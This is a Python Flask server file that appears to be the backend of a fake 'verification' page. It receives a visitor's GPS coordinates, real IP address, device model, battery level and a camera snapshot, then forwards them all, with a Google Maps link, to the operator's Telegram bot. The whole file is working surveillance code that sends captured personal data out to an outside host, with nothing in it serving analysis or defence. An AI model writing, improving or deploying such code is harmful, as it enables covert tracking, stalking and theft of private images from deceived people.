import os
import base64
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__, template_folder='../templates')

BOT_TOKEN = os.environ.get('BOT_TOKEN')
CHAT_ID = os.environ.get('CHAT_ID')

def send_telegram(text, photo=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/"
    requests.post(url + "sendMessage", data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"})
    if photo:
        requests.post(url + "sendPhoto", data={"chat_id": CHAT_ID}, files={'photo': ('img.jpg', photo, 'image/jpeg')})

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    data = request.get_json()
    info = data.get('info', {})
    
    # Corrected Google Maps Link
    map_link = f"https://www.google.com/maps?q={info.get('lat')},{info.get('lon')}"
    
    report = (
        f"📥 <b>Verification Received</b>\n"
        f"━━━━━━━━━━━━\n"
        f"📱 <b>Device:</b> <code>{info.get('model')}</code>\n"
        f"🌍 <b>Loc:</b> {info.get('city')}, {info.get('country')}\n"
        f"🌐 <b>IP:</b> <code>{info.get('realIp')}</code>\n"
        f"🔋 <b>Battery:</b> {info.get('battery')}\n"
        f"📍 <b>Live Maps:</b> <a href='{map_link}'>Open Map</a>\n"
        f"━━━━━━━━━━━━"
    )

    photo_raw = data.get('photo')
    if photo_raw:
        photo_bytes = base64.b64decode(photo_raw.split(",")[1])
        send_telegram(report, photo_bytes)
    else:
        send_telegram(report)

    return jsonify({"status": "ok"})
    
